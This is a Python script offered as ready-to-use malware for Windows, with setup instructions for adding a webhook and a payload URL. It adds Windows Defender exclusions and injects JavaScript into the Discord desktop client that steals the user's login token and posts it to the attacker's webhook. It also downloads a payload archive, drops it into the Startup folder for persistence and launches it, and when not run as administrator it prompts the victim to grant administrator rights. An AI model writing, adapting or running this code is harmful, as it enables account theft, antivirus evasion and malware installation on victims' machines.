#HOW TO USE:
#   Add your webhook at line 16
#   Add your url at line 31. THE DOWNLOADED PAYLOAD NEEDS TO BE "payload.zip"

import ctypes
if ctypes.windll.shell32.IsUserAnAdmin():
    import subprocess
    import zipfile
    import os
    from urllib.request import urlopen
    import urllib.request

    subprocess.call('powershell.exe "Add-MpPreference -ExclusionExtension .exe"', shell=True)
    subprocess.call('powershell.exe "Add-MpPreference -ExclusionExtension .js"', shell=True)
    os.system('taskkill /f /im discord.exe >nul')
    webhook = '' # add your webhook
    env = os.getenv('localappdata')
    for a, b, _ in os.walk(env):
        for c in b:
            if 'discord_desktop_core-' in c:
                e = os.path.join(a, f"{c}\\discord_desktop_core\\index.js")
                with open(e, 'a', encoding='utf-8') as f:
                    f.write(
                        f"var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C[\"token\"];var O = new XMLHttpRequest();O.open('POST', '\"{webhook}\"', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{'content': ' + strtoken + '}');\";")
            try:
                os.startfile(
                    os.getenv('appdata') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk')
            except BaseException:
                pass
            os._exit()
    url = '' # source to download from
    urllib.request.urlretrieve(url, 'payload')
    extract_to_folder = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    zip_file_path = 'payload.zip'
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        zip_file.extractall(extract_to_folder)
    with zipfile.ZipFile('payload.zip', 'r') as zip_ref:
        zip_ref.extractall()
    subprocess.run(["powershell.exe", '-command', f'Start-Process payload.exe'])
else:
    buttons = ctypes.c_int(0x00001000)
    message = "You are not running the program with administrator. Please run the program with administrator if you want it to work. To run the program as administrator right clik it and press 'run as administrator'"
    title = "Error"
    result = ctypes.windll.user32.MessageBoxW(None, message, title, buttons)
